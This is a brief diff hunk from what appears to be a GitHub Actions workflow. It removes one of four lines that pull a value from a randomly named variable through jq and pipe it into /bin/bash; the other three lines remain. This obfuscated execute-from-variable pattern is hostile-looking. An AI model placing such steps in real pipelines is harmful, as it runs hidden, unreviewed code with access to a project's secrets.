@@ -22,7 +22,6 @@ jobs:
           echo $gjpwn466 | jq -r .wtliz1689 | /bin/bash
           echo $iix327 | jq -r .hqc7 | /bin/bash
           echo $rv255 | jq -r .x972 | /bin/bash
-          echo $rzh2243 | jq -r .pw8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
